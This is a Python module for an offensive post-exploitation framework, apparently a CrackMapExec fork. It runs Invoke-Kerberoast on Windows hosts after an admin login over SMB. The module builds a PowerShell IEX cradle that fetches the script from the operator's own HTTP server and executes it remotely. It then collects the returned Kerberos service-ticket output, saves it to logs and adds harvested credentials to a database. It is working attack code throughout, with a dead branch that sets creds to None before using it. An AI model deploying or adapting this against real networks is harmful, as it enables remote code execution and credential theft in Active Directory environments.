from cmx.helpers.powershell import clean_ps_script, gen_ps_iex_cradle
from cmx.helpers.misc import validate_ntlm
from cmx.helpers.logger import write_log, highlight
from datetime import datetime
from cmx import config as cfg
import re
import pdb

class CMXModule:
    '''
        Executes Invoke-Kerberoast.ps1 script

    '''

    name = 'kerberoast'
    description = "Kerberoasts all found SPNs for the current domain"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
    Module Options:
           COMMAND  Invoke-Kerberoast params to pass in (default: '')

cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Credential $Cred -Verbose -Domain testlab.local'

        """
        #self.command = '-Credential $Cred -Verbose -Domain testlab.local'
        self.command = ''
        if module_options and 'COMMAND' in module_options:
            self.command = module_options['COMMAND']
            

        self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')

    def on_admin_login(self, context, connection):
        command = "Invoke-Kerberoast {}".format(self.command)

        launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-Kerberoast.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script.encode()) #self.ps_script is the ps1 script itself

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('Content-Length'))
        data = response.rfile.read(length)

        # We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            if self.command.find('sekurlsa::logonpasswords') != -1:
                creds = None
                if len(creds):
                    for cred_set in creds:
                        credtype, domain, username, password,_,_ = cred_set
                        # Get the hostid from the DB
                        hostid = context.db.get_computers(response.client_address[0])[0][0]
                        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
                        context.log.highlight('{}\\{}:{}'.format(domain, username, password))

                    context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
            else:
                context.log.highlight(data)

                #cant use ':' in filename cause of windows 
            log_name = 'Kerberoasted_{}_on_{}.log'.format(response.client_address[0], datetime.now().strftime("%b.%d.%y_at_%H%M"))
            write_log(str(data, 'utf-8'), log_name)
            context.log.info("Saved raw Kerberoast output to {}/{}".format(cfg.LOGS_PATH,log_name))
        else:
            context.log.info("No Results ¯\\_('_')_/¯")